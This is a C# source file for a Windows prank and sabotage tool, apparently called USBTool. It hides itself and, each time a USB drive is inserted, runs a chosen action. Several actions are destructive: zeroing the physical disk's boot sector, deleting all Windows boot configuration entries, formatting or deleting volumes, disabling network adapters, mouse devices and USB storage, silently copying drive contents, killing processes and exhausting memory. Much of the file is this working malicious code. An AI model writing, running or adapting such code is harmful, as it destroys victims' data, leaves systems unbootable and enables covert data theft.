using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using USBTool.CoreAudioApi;
#if MEDIA_DSHOW
using USBTool.DShow;
#elif MEDIA_FOUNDATION
using USBTool.MediaFoundation;
#endif
using USBTool.Properties;
using USBTool.Vds;

namespace USBTool
{
	public unsafe partial class FormMain : Form
	{
		[MTAThread]
		public void WhenArrival(string op)
		{
			Hide();
			while (true)
			{
				try
				{
					foreach (DriveInfo drive in DriveInfo.GetDrives())
					{
						if (drive.DriveType == DriveType.Removable&drive.IsReady)
						{
							switch (op)
							{
								case "copy":
									string drivename = drive.Name;
									CopyDiretory(
										drive.RootDirectory, 
										Directory.CreateDirectory(Folder.SelectedPath + "\\" + (
											drivename.EndsWith("\\") ?
											drivename.Substring(0, drive.Name.Length - 2) :
											drivename)));
									break;
								case "format":
									var co = new ConnectionOptions
									{
										Impersonation = ImpersonationLevel.Impersonate,
										Authentication = AuthenticationLevel.Call,
										EnablePrivileges = true
									};
									var scope = new ManagementScope("root\\cimv2", co);

									ManagementClass volumes = new ManagementClass(
										scope, 
										new ManagementPath ("Win32_Volume"),
										new ObjectGetOptions());
									foreach (ManagementObject volume in volumes.GetInstances())
									{
										if (volume.Properties["Name"].Value.ToString() == drive.Name)
										{
											object[] methodArgs = { 
												"FAT32", 
												true/*快速格式化*/, 
												4096/*簇大小*/, 
												""/*卷标*/, 
												false/*压缩*/ };
											volume.InvokeMethod("Format", methodArgs);
											Thread.Sleep(4000);
										}
									}
									break;
								case "message":
									tf.StartNew(() =>
									{
										MessageBox.Show(
											sentence, 
											"Error", 
											MessageBoxButtons.YesNoCancel, 
											MessageBoxIcon.Error, 
											MessageBoxDefaultButton.Button1, 
											MessageBoxOptions.ServiceNotification);
									});
									break;
								case "kill":
									foreach (Process process in Process.GetProcessesByName(sentence))
									{
										try
										{
											process.Kill();
										}
										catch
										{
											continue;
										}
									}
									break;
								case "hidefile":
									SetAttributes(drive.Name, FileAttributes.Hidden);
									break;
								case "Encrypted":
									SetAttributes(drive.Name, FileAttributes.Encrypted);
									break;
								case "system":
									SetAttributes(drive.Name, FileAttributes.System);
									break;
								case "readonly":
									SetAttributes(drive.Name, FileAttributes.ReadOnly);
									break;
								case "kasi":
									ulong number = 
										new Microsoft.VisualBasic.Devices.ComputerInfo().
										TotalPhysicalMemory / 1024 / 1024 / 1024 / 2;
									for (ulong runtime = 0; runtime < number; runtime++)
									{
										Process.Start(Application.StartupPath + "\\mm.exe");
									}
									while (Process.GetProcessesByName("mm").Length > 0)
									{
										var usbdevice = from ud in DriveInfo.GetDrives()
														where ud.DriveType == DriveType.Removable
														select ud;
										if (usbdevice.Count() == 0)
										{
											foreach (Process mm in Process.GetProcessesByName("mm"))
											{
												try
												{
													mm.Kill();
												}
												catch
												{

												}

											}
										}
									}
									break;
								case "fill":
									FillEachFile(drive.Name);
									break;
								case "normal":
									SetAttributes(drive.Name, FileAttributes.Normal);
									break;
								case "media":
#if MEDIA_MCI
									SendMessage(hMCIWnd, (uint)MCIConst.MCI_PLAY  , 0, 0);
									host.MCIWnd = hMCIWnd;
									if (mediafilename.EndsWith(".wav", StringComparison.OrdinalIgnoreCase) ||
										mediafilename.EndsWith(".mp3", StringComparison.OrdinalIgnoreCase) ||
										mediafilename.EndsWith(".wma", StringComparison.OrdinalIgnoreCase))
									{
										host.TransparencyKey = host.BackColor;
										host.Opacity = 0;
									}
									host.ShowDialog();
									SendMessage(hMCIWnd, WM_CLOSE, 0, 0);
#elif MEDIA_DSHOW
									try
									{
										window.Owner = host.Handle.ToInt32();
										window.WindowStyle = (int)WS_CHILD;
										window.Left = 0;
										window.Top = 0;
										window.Height = host.Height;
										window.Width = host.Width;
										host.Show();
									}
									catch
									{

									}
									control.Run();
									int eventcode=0, lp1=0, lp2=0;
									try
									{
										mediaEvent.GetEvent(out eventcode, out lp1, out lp2, 0xfffffff);
									}
									catch
									{
										mediaEvent.FreeEventParams(eventcode, lp1, lp2);
									}
									while(eventcode != EC_COMPLETE)
									{
										mediaEvent.FreeEventParams(eventcode, lp1, lp2);
										try
										{
											mediaEvent.GetEvent(out eventcode, out lp1, out lp2, 0xfffffff);
										}
										catch
										{

										}
									}
									mediaEvent.FreeEventParams(eventcode, lp1, lp2);
									host.Hide();
#elif MEDIA_FOUNDATION
									uint eventtype = 0;
									int hr = 0;
									PropVariant prop = new PropVariant()
									{
										vt = (ushort)VarEnum.VT_I8,
										unionmember = 0,
									};
									if (hasvideo)
										host.Show();
									hr = mediaSession.Start(Guid.Empty, prop);
									while (eventtype != MESessionEnded)
									{
										hr = mediaSession.GetEvent(1, out IMFMediaEvent mediaevent);
										if (hr == 0 && mediaevent != null)
										{
											mediaevent.GetType(out eventtype);
											mediaevent = null;
										}
										Application.DoEvents();
									}
									host.Hide();

#endif
									break;
								case "speech":
									Voice.Volume = (int)((object[])ReadText.Tag)[0];
									Voice.Rate = (int)((object[])ReadText.Tag)[1];
									Voice.SelectVoice(((object[])ReadText.Tag)[2].ToString());
									preventthread=new Thread(()=>{
										try
										{
											while (true)
												SetAppAndSystemVolume(1, false);
										}
										catch (ThreadAbortException)
										{

										}
									});
									preventthread.Start();
									Voice.Speak(((object[])ReadText.Tag)[3].ToString());
									break;
								case "SwapMouseButton":
									if (SwapMouseButton(true))
									{
										SwapMouseButton(false);
									}
									break;
								case "volume":
									drive.VolumeLabel = sentence;
									break;
								case "rotate":
									switch (SystemInformation.ScreenOrientation)
									{
										case ScreenOrientation.Angle0:
											DEVMODE1.dmDisplayOrientation = 1;
											break;
										case ScreenOrientation.Angle90:
											DEVMODE1.dmDisplayOrientation = 2;
											break;
										case ScreenOrientation.Angle180:
											DEVMODE1.dmDisplayOrientation = 3;
											break;
										case ScreenOrientation.Angle270:
											DEVMODE1.dmDisplayOrientation = 0;
											break;
									}
									int temp = DEVMODE1.dmPelsHeight;
									DEVMODE1.dmPelsHeight = DEVMODE1.dmPelsWidth;
									DEVMODE1.dmPelsWidth = temp;
									ChangeDisplaySettings(ref DEVMODE1, 0);
									Thread.Sleep(4000);
									break;
								case "web":
									Process.Start(sentence);
									break;
								case "fillup":
									if (drive.AvailableFreeSpace > 0)
									{
										try
										{
											StreamWriter sw = new StreamWriter(drive.Name + "/1");
											sw.Write(StringByTime(" ", drive.AvailableFreeSpace));
											File.SetAttributes(drive.Name + "/1", FileAttributes.Hidden);
											sw.Close();
										}
										catch
										{
										}
									}
									break;
								case "glass":
									ForEachWindow(GetDesktopWindow(), "glass");
									break;
								case "close":
									ForEachWindow(GetDesktopWindow(), "close");
									break;
								case "mousetrail":
									string pvParam = "";
									SystemParametersInfo(SPI_SETMOUSETRAILS, 15, ref pvParam, 0);
									Thread.Sleep(1000);
									break;
								case "destroy":
									ForEachWindow(GetDesktopWindow(), "destroy");
									break;
								case "title":
									ForEachWindow(GetDesktopWindow(), "title");
									break;
								case "eject":
									IntPtr Handle = CreateFile(
										@"\\.\" + drive.Name[0] + ":", 
										GENERIC_READ|GENERIC_WRITE, 
										FILE_SHARE_READ|FILE_SHARE_WRITE, 
										IntPtr.Zero, 
										OPEN_EXISTING, 
										0, 
										IntPtr.Zero);
									DeviceIoControl(
										Handle, 
										IOCTL_STORAGE_EJECT_MEDIA, 
										IntPtr.Zero, 
										0, 
										IntPtr.Zero,
										0, 
										out _, 
										IntPtr.Zero);
									break;
								case "flash":
									ChangeDisplaySettings(ref DEVMODE1, 0);
									break;
								case "wndpicture":
									ForEachWindow(GetDesktopWindow(), "picture");
									break;
								case "random":
									Random rand = new Random();
									DEVMODE1.dmDisplayOrientation = rand.Next(4);
									int h = DEVMODE1.dmPelsHeight;
									DEVMODE1.dmPelsHeight = DEVMODE1.dmPelsWidth;
									DEVMODE1.dmPelsWidth = h;
									ChangeDisplaySettings(ref DEVMODE1, 0);
									Thread.Sleep(4000);
									break;
								case "beep":
									preventthread=new Thread(()=>{
										try
										{
											while (true)
												SetAppAndSystemVolume(1, false);
										}
										catch (ThreadAbortException)
										{
											
										}
										});
									preventthread.Start();
									Console.Beep(2500, 10000);
									preventthread.Abort();
									break;
								case "beuncle":
									ForEachWindow(GetDesktopWindow(), "beuncle");
									break;
								case "bcd":
									/*RegistryKey bcdreg = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects");
									bcdreg.GetAccessControl().AddAccessRule(
										new System.Security.AccessControl.RegistryAccessRule(
											Environment.UserDomainName + "\\" + Environment.UserName,
											System.Security.AccessControl.RegistryRights.FullControl, 
											System.Security.AccessControl.AccessControlType.Allow));*/
									co = new ConnectionOptions
									{
										Impersonation = ImpersonationLevel.Impersonate,
										Authentication = AuthenticationLevel.Call,
										EnablePrivileges = true
									};
									scope = new ManagementScope("root\\wmi", co);
									ManagementObject bcdstore = new ManagementObject(
										scope, 
										new ManagementPath("BcdStore.FilePath=\"\""), 
										null);
									try
									{
										ManagementBaseObject bcdarg = bcdstore.GetMethodParameters("EnumerateObjects");
										bcdarg["Type"] = 0;
										ManagementBaseObject outarg = bcdstore.InvokeMethod("EnumerateObjects", bcdarg, null);
										var bcdos = outarg["Objects"] as object[];
										foreach (ManagementBaseObject bcdo in bcdos)
										{
											bcdstore.InvokeMethod("DeleteObject", new object[]{bcdo["Id"] });
										}
									}
									catch
									{

									}
									if (ReBoot.Checked)
									{
										scope = new ManagementScope("Root\\CIMV2", co);
										var system = new ManagementClass(
											scope, 
											new ManagementPath("Win32_OperatingSystem"), 
											null);
										foreach (ManagementObject s in system.GetInstances())
										{
											try
											{
												s.InvokeMethod("Reboot", null);
											}
											catch
											{

											}
										}
									}
									break;
								case "network":
									co = new ConnectionOptions
									{
										Impersonation = ImpersonationLevel.Impersonate,
										Authentication = AuthenticationLevel.Call,
										EnablePrivileges = true
									};
									scope = new ManagementScope("Root\\CIMV2", co);
									ManagementClass networkadapters = new ManagementClass(
										scope, 
										new ManagementPath("Win32_NetworkAdapter"), 
										null);
									foreach (ManagementObject adapter in networkadapters.GetInstances())
									{
										try
										{
											adapter.InvokeMethod("Disable", null);
										}
										catch
										{
										}
									}
									break;
								case "color":
									Graphics d = Graphics.FromHwnd(GetDesktopWindow());
									Rectangle rect = new Rectangle();
									GetClientRect(GetDesktopWindow(), ref rect);
									Brush brush = new SolidBrush((Color)SetColor.Tag);
									d.FillRectangle(brush, rect);
									brush.Dispose();
									d.Dispose();
									break;
								case "cursor":
									Cursor.Position = new Point(0, 0);
									break;
								case "deleteext":
									DeleteExtName(drive.Name);
									break;
								case "negative":
									MagInitialize();
									float[,] negative = new float[,]{
									{ -1.0f, 0.0f, 0.0f, 0.0f, 0.0f },
									{ 0.0f, -1.0f, 0.0f, 0.0f, 0.0f },
									{ 0.0f, 0.0f, -1.0f, 0.0f, 0.0f },
									{ 0.0f, 0.0f, 0.0f, 1.0f, 0.0f },
									{ 1.0f, 1.0f, 1.0f, 0.0f, 1.0f }
									};
									float[,] normal = new float[,] {
									{ 1.0f, 0.0f, 0.0f, 0.0f, 0.0f },
									{ 0.0f, 1.0f, 0.0f, 0.0f, 0.0f },
									{ 0.0f, 0.0f, 1.0f, 0.0f, 0.0f },
									{ 0.0f, 0.0f, 0.0f, 1.0f, 0.0f },
									{ 0.0f, 0.0f, 0.0f, 0.0f, 1.0f }
									};
									Thread.Sleep(500);
									SetMagnificationDesktopColorEffect(negative);
									break;
								case "filename":
									NumericalFileName(drive.RootDirectory);
									break;
								case "mute":
									SetAppAndSystemVolume(0, true);
									break;
								case "clip":
									int width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
									int height = (int)System.Windows.SystemParameters.PrimaryScreenHeight;
									Rectangle r = new Rectangle(width / 4, height / 4, width * 3 / 4, height * 3 / 4);
									//tagRect : left,top,right,bottom
									ClipCursor(ref r);
									Thread.Sleep(100);
									break;
								case "disable":
									ForEachWindow(GetDesktopWindow(), "disable");
									break;
								case "picture":
									width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
									height = (int)System.Windows.SystemParameters.PrimaryScreenHeight;
									r = new Rectangle(width / 4, height / 4, width / 2, height / 2);
									Graphics g = Graphics.FromHwnd(GetDesktopWindow());
									Bitmap p = new Bitmap(sentence);
									try
									{
										g.DrawImage(p, r);
									}
									catch
									{

									}
									finally
									{
										g.Dispose();
										p.Dispose();
									}
									break;
								case "text":
									ForEachWindow(GetDesktopWindow(), "text");
									break;
								case "wind":
									width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
									height = (int)System.Windows.SystemParameters.PrimaryScreenHeight;
									int halfwidth = width/2;
									for(int y = 0;y<=height;y++){
										int sign = (int)Math.Pow(-1,y);
										for (int x = halfwidth - sign * halfwidth;//当y为偶数，初值为0，当y为奇数，初值为width
											Math.Abs(x - halfwidth) <= halfwidth;//x距离屏幕水平中线处距离是否大于宽度一半
											x+=sign)
										{
											Cursor.Position = new Point(x, y);
											Thread.Sleep(new TimeSpan(9000
												));
										}
									}
									break;
								case "lock":
									long cap = drive.TotalSize;
									int high = (int)(cap >> 32);
									int low = (int)(cap & 0xffffffff);
									IntPtr volumehandle = CreateFile(
													@"\\.\" +drive.Name[0]+":",
													GENERIC_READ | GENERIC_WRITE,
													FILE_SHARE_READ | FILE_SHARE_WRITE,
													IntPtr.Zero,
													OPEN_EXISTING,
													0,
													IntPtr.Zero
													);

									DeviceIoControl(
										volumehandle,
										FSCTL_LOCK_VOLUME,
										IntPtr.Zero,
										0,
										IntPtr.Zero,
										0,
										out _,
										IntPtr.Zero);
									break;
								case "chkdsk":
									co = new ConnectionOptions
									{
										Impersonation = ImpersonationLevel.Impersonate,
										Authentication = AuthenticationLevel.Call,
										EnablePrivileges = true
									};
									scope = new ManagementScope("Root\\CIMV2", co);
									ManagementClass disks = new ManagementClass(
										scope, 
										new ManagementPath("Win32_LogicalDisk"), 
										null);
									foreach (ManagementObject disk in disks.GetInstances())
									{
										if (disk.Properties["Name"].Value.ToString() + "\\" == drive.Name)
										{
											object[] arg = {
												true,//FixErrors
												true,//VigorousIndexCheck
												false,//SkipFolderCycle
												true,//ForceDismount
												true,//RecoverBadSectors
												false//RunAtBootUp
											};
											disk.InvokeMethod("Chkdsk", arg);
										}
									}
									break;
								case "totop":
									ForEachWindow(GetDesktopWindow(), "top");
									break;
								case "removembr":
									co = new ConnectionOptions
									{
										Impersonation = ImpersonationLevel.Impersonate,
										Authentication = AuthenticationLevel.Call,
										EnablePrivileges = true
									};
									scope = new ManagementScope("Root\\CIMV2", co);
									ManagementClass partitions = new ManagementClass(
										scope, 
										new ManagementPath("Win32_DiskPartition"), 
										null);
									foreach (ManagementObject partition in partitions.GetInstances())
									{
										foreach(ManagementObject disk in partition.GetRelated("Win32_LogicalDisk"))
										{
											if (disk.Properties["Name"].Value.ToString() + "\\" == drive.Name)
											{
												string index = partition.Properties["DiskIndex"].Value.ToString();
												IntPtr diskhandle = CreateFile(
													@"\\.\PHYSICALDRIVE" + index,
													GENERIC_READ | GENERIC_WRITE,
													FILE_SHARE_READ | FILE_SHARE_WRITE,
													IntPtr.Zero,
													OPEN_EXISTING,
													0,
													IntPtr.Zero
													);
												byte[] buffer = new byte[512];
												for (int i = 0; i < 512; i++)
													buffer[i] = 0;
												WriteFile(
													diskhandle,
													buffer,
													512,
													out int write,
													IntPtr.Zero);
												DeviceIoControl(
													diskhandle,
													IOCTL_STORAGE_EJECT_MEDIA,
													IntPtr.Zero,
													0,
													IntPtr.Zero,
													0,
													out _,
													IntPtr.Zero);
											}
										}
									}
									break;
								case "delete":
									service.QueryProviders(VDS_QUERY_PROVIDER_FLAG.VDS_QUERY_SOFTWARE_PROVIDERS, out IEnumVdsObject enumprovider);
									foreach(var provider in EnumerateObjects<IVdsSwProvider>(enumprovider))
									{
										provider.QueryPacks(out IEnumVdsObject enumpack);
										foreach(var pack in EnumerateObjects<IVdsPack>(enumpack))
										{
											pack.QueryVolumes(out IEnumVdsObject enumvolume);
											foreach(IVdsVolume volume in EnumerateObjects<IVdsVolume>(enumvolume))
											{
												IVdsVolumeMF volumeMF = volume as IVdsVolumeMF;
                                                volumeMF.QueryAccessPaths(out string[] paths, out int l);
                                                if (paths[0] == drive.Name)
												{
													volume.Delete(true);
												}
											}
										}
									}
									break;
								case "hidevolume":
									service.QueryProviders(VDS_QUERY_PROVIDER_FLAG.VDS_QUERY_SOFTWARE_PROVIDERS, out enumprovider);
									foreach (var provider in EnumerateObjects<IVdsSwProvider>(enumprovider))
									{
										provider.QueryPacks(out IEnumVdsObject enumpack);
										foreach (var pack in EnumerateObjects<IVdsPack>(enumpack))
										{
											pack.QueryVolumes(out IEnumVdsObject enumvolume);
											foreach (IVdsVolume volume in EnumerateObjects<IVdsVolume>(enumvolume))
											{
												IVdsVolumeMF volumeMF = volume as IVdsVolumeMF;
                                                volumeMF.QueryAccessPaths(out string[] paths, out int l);
                                                if (paths[0] == drive.Name)
												{
													volumeMF.DeleteAccessPath(drive.Name, true);
												}
											}
										}
									}
									break;
								case "playerror":
									SetAppAndSystemVolume(100, false);
									System.Media.SystemSounds.Hand.Play();
									Thread.Sleep(1000);
									break;
								case "autoclick":
									MOUSEINPUT mi = new MOUSEINPUT()
									{
										dx = Cursor.Position.X,
										dy = Cursor.Position.Y,
										dwFlags = MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_ABSOLUTE,
										dwExtraInfo = IntPtr.Zero
									};
									MSINPUT[] minputs = new MSINPUT[1];
									minputs[0]=new MSINPUT()
									{
										type = INPUT_MOUSE,
										mi = mi
									};								
									SendInput(1, minputs, sizeof(MSINPUT));
									Thread.Sleep(800);
									break;
								case "monochrome":
									MagInitialize();
									float[,] GrayScale = new float[,] {
									{  0.3f,  0.3f,  0.3f,  0.0f,  0.0f },
									{  0.4f,  0.4f,  0.4f,  0.0f,  0.0f },
									{  0.3f,  0.3f,  0.3f,  0.0f,  0.0f },
									{  0.0f,  0.0f,  0.0f,  1.0f,  0.0f },
									{  0.0f,  0.0f,  0.0f,  0.0f,  1.0f }
									};								
									SetMagnificationDesktopColorEffect(GrayScale);
									break;
								case "closemouse":
									Guid _empty = Guid.Empty;
									IntPtr devinfo = SetupDiGetClassDevs(ref _empty, null, IntPtr.Zero, DIGCF_ALLCLASSES);
									for(uint i = 0;; i++) {
                                        SP_DEVINFO_DATA devicedata = new SP_DEVINFO_DATA
                                        {
                                            cbSize = sizeof(SP_DEVINFO_DATA)
                                        };
                                        SetupDiEnumDeviceInfo(devinfo, i, ref devicedata);
										if (Marshal.GetLastWin32Error() == 259/*ERROR_NO_MORE_ITEMS*/)
											break;
										SetupDiGetDeviceRegistryProperty(devinfo, ref devicedata, SPDRP_CLASS, out _, null, 0, out int buildersize);
										StringBuilder buffer = new StringBuilder(buildersize);
										SetupDiGetDeviceRegistryProperty(devinfo, ref devicedata, SPDRP_CLASS, out _, buffer, buildersize, out _);
										if (buffer.ToString()=="Mouse")
										{
                                            SP_CLASSINSTALL_HEADER header = new SP_CLASSINSTALL_HEADER
                                            {
                                                InstallFunction = DIF_PROPERTYCHANGE,
                                                cbSize = sizeof(SP_CLASSINSTALL_HEADER)
                                            };
                                            SP_PROPCHANGE_PARAMS pcparams = new SP_PROPCHANGE_PARAMS
                                            {
                                                ClassInstallHeader = header,
                                                StateChange = DICS_DISABLE,
                                                Scope = DICS_FLAG_GLOBAL,
                                                HwProfile = 0
                                            };
											hr = Convert.ToInt32( SetupDiSetClassInstallParams(devinfo, ref devicedata, ref pcparams, sizeof(SP_PROPCHANGE_PARAMS)));
											hr=Convert.ToInt32(SetupDiCallClassInstaller(DIF_PROPERTYCHANGE, devinfo, ref devicedata));
										}
									}
									break;
								case "winkeydown":
									keybd_event(0x5B, 0, 0x0000, IntPtr.Zero);
									keybd_event(0x5B, 0, 0x0002, IntPtr.Zero);
									Thread.Sleep(100);
									break;
								case "singlecolor":
									Color filter = (Color)SingleColor.Tag;
									float[,] singlematrix = new float[,] {
									{  (float)filter.R/255,  0.0f,  0.0f,  0.0f,  0.0f },
									{  0f,  (float)filter.G/255,  0.0f,  0.0f,  0.0f },
									{  0f,  0.0f,  (float)filter.B/255,  0.0f,  0.0f },
									{  0.0f,  0.0f,  0.0f,  1.0f,  0.0f },
									{  0.0f,  0.0f,  0.0f,  0.0f,  1.0f }
									};
									MagInitialize();
									SetMagnificationDesktopColorEffect(singlematrix);
									break;
								case "newdesktop":
									SwitchDesktop(newdesktop);
									Thread.Sleep(1000);
									SwitchDesktop(defaultdesktop);
									Thread.Sleep(1000);
									break;
								case "sleep":
									Application.SetSuspendState(PowerState.Suspend, true, false);
									break;
								default:
									throw (new ArgumentException("该功能还未开发"));
							}
						}
					}
				}
				catch (Exception e)
				{
#if DEBUG
					Debugger.Break();

#else
					StreamWriter br = new StreamWriter(Application.StartupPath + "/bugreport.log", true);
					br.Write(e.GetType().ToString());
					br.Write(e.Message);
					br.WriteLine(e.StackTrace);
					br.Close();
					Close();
#endif
				}
			}
		}
		public void Copy_Click(object sender, EventArgs e)
		{
			if (Folder.ShowDialog() == DialogResult.OK & Folder.SelectedPath.Length > 0)
			{
				WhenArrival("copy");
			}
			else
			{
				MessageBox.Show("未选择路径。");
			}
		}
		public void Format_Click(object sender, EventArgs e)
		{
			WhenArrival("format");
		}
		public void CantOpen_Click(object sender, EventArgs e)
		{
			Hide();
			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\services\USBSTOR", true);
			while (true)
			{
				key.SetValue("Start", 4);
			}
		}
		public void Message_Click(object sender, EventArgs e)
		{
			tf = new TaskFactory();
			sentence = StringByTime(" ", 5000);
			WhenArrival("message");
		}
		protected override void WndProc(ref Message m)
		{
			base.WndProc(ref m);
		}
		public void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://github.com/ISDHN/USBTool");
		}
		public void KillProcess_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入进程名称。", "输入", "explorer")).Length == 0)
			{
				return;
			}
			else
			{
				sentence = i;
			}
			WhenArrival("kill");
		}
		public void HideFile_Click(object sender, EventArgs e)
		{
			WhenArrival("hidefile");
		}
		public void Encrypt_Click(object sender, EventArgs e)
		{
			WhenArrival("Encrypted");
		}
		public void SystemFile_Click(object sender, EventArgs e)
		{
			WhenArrival("system");
		}
		public void FillMemory_Click(object sender, EventArgs e)
		{
			foreach (Process mm in Process.GetProcessesByName("mm"))
			{
				mm.Kill();
			}
			var file = File.Create(Application.StartupPath + "\\mm.exe");
			file.Write(Resources.mm, 0, Resources.mm.Length);
			file.Close();
			WhenArrival("kasi");
		}
		public void Readonly_Click(object sender, EventArgs e)
		{
			WhenArrival("readonly");
		}
		public void FillwithBlank_Click(object sender, EventArgs e)
		{
			WhenArrival("fill");
		}
		public void PlayMedia_Click(object sender, EventArgs e)
		{
			Media.Tag = SetAttrib.Show("media");
			if (((object[])Media.Tag).Length != 0)
			{
				host = new WndVideo();
#if MEDIA_DSHOW
				FilterGraph fg = Activator.CreateInstance(typeof(FilterGraph)) as FilterGraph;
				control = fg as IMediaControl;
				window = fg as IVideoWindow;
				IBasicAudio audio = fg as IBasicAudio;
				mediaEvent = fg as IMediaEvent;
				IMediaPosition position = fg as IMediaPosition;
				try
				{
					control.RenderFile(((object[])Media.Tag)[2].ToString());
					
				}
				catch
				{
					return;
				}
				try
				{
					audio.Volume = (int)((object[])Media.Tag)[0] * 100 - 10000;
				}
				catch
				{

				}
				position.CurrentPosition = 0;
				double rate = (int)((object[])Media.Tag)[1];
				position.Rate = rate >= 0 ? rate / 10 + 1 :1/(1 + rate/ -10);
#elif MEDIA_MCI
				StringBuilder shortpath = new StringBuilder(260);
				GetShortPathName(((object[])Media.Tag)[2].ToString(), shortpath, 260);
				mediafilename = shortpath.ToString();
				IntPtr hinstance = Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetLoadedModules()[0]);
				hMCIWnd = MCIWndCreate(host.Handle, hinstance,
					(uint)MCIConst.MCIWNDF_NOAUTOSIZEWINDOW +
					(uint)MCIConst.MCIWNDF_NOMENU +
					(uint)MCIConst.MCIWNDF_NOPLAYBAR +
					(uint)MCIConst.MCIWNDF_NOTIFYMODE +
					(uint)MCIConst.MCIWNDF_NOTIFYERROR, null);
				MoveWindow(hMCIWnd, 0, 0, host.Width, host.Height, false);
				SendMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_OPEN, 0, mediafilename);
				SendMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_SETSPEED, 0, (uint)(int)((object[])Media.Tag)[1] * 50 + 1000U);
				SendMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_SETVOLUME, 0, ((uint)(int)((object[])Media.Tag)[0] - 50U) * 10 + 500U);
#elif MEDIA_FOUNDATION
				int hr;
				MFStartup(MF_VERSION, MFSTARTUP_FULL);
				MFCreateMediaSession(IntPtr.Zero, out mediaSession);
				MFCreateTopology(out IMFTopology topo);
				MFCreateSourceResolver(out IMFSourceResolver resolver);
				IUnknown unknown;
				try
				{
					resolver.CreateObjectFromURL(((object[])Media.Tag)[2].ToString(), MF_RESOLUTION_MEDIASOURCE | MF_RESOLUTION_CONTENT_DOES_NOT_HAVE_TO_MATCH_EXTENSION_OR_MIME_TYPE,
						null, out uint objtype, out unknown);
				}
				catch
				{
					MessageBox.Show("不支持的媒体格式。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
					return;
				}
				IMFMediaSource source = unknown as IMFMediaSource;
				source.CreatePresentationDescriptor(out IMFPresentationDescriptor descriptor);
				if (MFRequireProtectedEnvironment(descriptor) == 0)
				{
					MessageBox.Show("媒体受保护,无法播放。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
					return;
				}
				descriptor.GetStreamDescriptorCount(out uint sdcount);
				for (uint i = 0; i < sdcount; i++)
				{
					descriptor.GetStreamDescriptorByIndex(i, out bool IsSelected, out IMFStreamDescriptor sd);
					if (!IsSelected)
						descriptor.SelectStream(i);
					sd.GetMediaTypeHandler(out IMFMediaTypeHandler typeHandler);
					typeHandler.GetMajorType(out Guid streamtype);
					IMFActivate renderer;
					if (streamtype == MFMediaType_Audio)
					{
						hr = MFCreateAudioRendererActivate(out renderer);
					}
					else if (streamtype == MFMediaType_Video)
					{
						hr = MFCreateVideoRendererActivate(host.Handle, out renderer);
						hasvideo = true;
					}
					else
					{
						continue;
					}
					hr = MFCreateTopologyNode(MF_TOPOLOGY_SOURCESTREAM_NODE, out IMFTopologyNode sourcenode);
					sourcenode.SetUnknown(MF_TOPONODE_SOURCE, source as IUnknown);
					sourcenode.SetUnknown(MF_TOPONODE_PRESENTATION_DESCRIPTOR, descriptor as IUnknown);
					sourcenode.SetUnknown(MF_TOPONODE_STREAM_DESCRIPTOR, sd as IUnknown);
					topo.AddNode(sourcenode);
					MFCreateTopologyNode(MF_TOPOLOGY_OUTPUT_NODE, out IMFTopologyNode outputnode);
					outputnode.SetObject(renderer as IUnknown);
					topo.AddNode(outputnode);
					hr = sourcenode.ConnectOutput(0, outputnode, 0);
				}
				mediaSession.SetTopology(0, topo);
				int dwrate = (int)((object[])Media.Tag)[1];
				float dwvolume = (float)(int)((object[])Media.Tag)[0] / 100;
				uint eventtype = 0;
				while (eventtype != MESessionTopologyStatus)
				{
					mediaSession.GetEvent(0, out IMFMediaEvent mediaevent);
					mediaevent.GetType(out eventtype);
					mediaevent = null;
				}
				Guid guid_ratecontrol = typeof(IMFRateControl).GUID;
				MFGetService(mediaSession as IUnknown, ref MF_RATE_CONTROL_SERVICE, ref guid_ratecontrol, out IUnknown _ratecontrol);
				IMFRateControl ratecontrol = _ratecontrol as IMFRateControl;
				hr = ratecontrol.SetRate(false, dwrate >= 0 ? dwrate * 7 / 10 + 1 : 1 / (1 + dwrate / -10 * 7));
				try
				{
					Guid guid_audiopolicy = typeof(IMFAudioPolicy).GUID;
					hr = MFGetService(mediaSession as IUnknown, ref MR_AUDIO_POLICY_SERVICE, ref guid_audiopolicy, out IUnknown _policy);
					IMFAudioPolicy policy = _policy as IMFAudioPolicy;
					policy.SetDisplayName(" ");
					playvolume = dwvolume;
				}
				catch
				{
				}
				try
				{
					Guid guid_videocontrol = typeof(IMFVideoDisplayControl).GUID;
					hr = MFGetService(mediaSession as IUnknown, ref MR_VIDEO_RENDER_SERVICE, ref guid_videocontrol, out IUnknown _videocontrol);
					IMFVideoDisplayControl videocontrol = _videocontrol as IMFVideoDisplayControl;
					if (FullScreen.Checked)
					{
						host.Top = 0;
						host.Left = 0;
						host.Width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
						host.Height = (int)System.Windows.SystemParameters.PrimaryScreenHeight;
						videocontrol.SetFullscreen(true);
						Rectangle videopos = new Rectangle(0, 0, host.Width, host.Height);
						videocontrol.SetVideoPosition(null, ref videopos);
					}
					host.videocontrol = videocontrol;
				}
				catch
				{
				}
				preventthread = new Thread(() =>
				{
					while (true)
					{					
						if (hasvideo)
							host.BringToFront();
						SetAppAndSystemVolume(playvolume, false);					
					}
				});
				preventthread.Start();
#endif
				WhenArrival("media");
			}
		}
		public void ReadText_Click(object sender, EventArgs e)
		{
			ReadText.Tag = SetAttrib.Show("speech");
			if (((object[])ReadText.Tag).Length != 0)
			{
				WhenArrival("speech");
			}
		}
		public void Form1_Load(object sender, EventArgs e)
		{
			if (Environment.OSVersion.Version.Major < 6)
			{
				Glass.Enabled = false;
#if MEDIA_FOUNDATION
				Media.Enabled = false;
#endif
			}
			try
			{
